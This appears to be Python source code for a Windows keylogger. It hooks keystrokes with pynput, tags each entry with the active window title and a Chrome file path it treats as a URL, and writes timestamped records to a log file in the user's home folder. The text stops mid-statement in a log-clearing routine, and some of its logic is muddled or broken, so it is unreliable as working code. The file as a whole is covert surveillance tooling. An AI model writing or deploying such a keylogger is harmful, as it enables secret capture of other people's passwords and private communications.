from pynput import keyboard
import time
import os
import win32gui
import win32process
import psutil

log_dir = os.path.expanduser('~')
log_file = os.path.join(log_dir, 'keystrokes_log.txt')
current_word = ""
current_session = {}

def get_active_window_info():
    window_handle = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(window_handle)
    
    pid = win32process.GetWindowThreadProcessId(window_handle)
    process = psutil.Process(pid[-1])
    
    try:
        exe_name = process.name()
        if exe_name.lower() == 'chrome.exe':
            browser_tabs = psutil.Process(pid[-1]).open_files()
            for tab in browser_tabs:
                if 'chrome' in tab.path:
                    current_url = tab.path
                    break
            else:
                current_url = ""
        else:
            current_url = ""
    except Exception:
        current_url = ""
    
    return window_title, current_url

def on_key_press(key):
    global current_word, current_session

    try:
        if hasattr(key, 'char'):
            current_word += key.char
        elif key == keyboard.Key.space:
            save_current_word()
            current_word += ' '
        elif key == keyboard.Key.enter:
            save_current_word()
            current_word += ' [ENTER] '
    except AttributeError:
        pass

    current_window, current_url = get_active_window_info()
    current_timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    if current_window not in current_session:
        current_session[current_window] = []

    current_session[current_window].append({'timestamp': current_timestamp, 'url': current_url, 'text': current_word})
    
    if len(current_session[current_window]) >= 10:  # Adjust the threshold as needed
        save_current_session(current_window)

def save_current_word():
    global current_word

    if current_word:
        current_word = ""

def save_current_session(window_title):
    global current_session

    if window_title in current_session:
        session_data = current_session[window_title]
        try:
            with open(log_file, 'a') as f:
                for entry in session_data:
                    f.write(f'{entry["timestamp"]} - [{window_title}] [{entry["url"]}] {entry["text"]}\n')
            current_session[window_title] = []
            clear_log_file_if_needed()
        except Exception as e:
            print("Error writing to file:", e)

def clear_log_file_if_needed():
    try:
        file_size = os.path.getsize(log_file)
        if file_size >= 1000000:  # 1 MB
            open
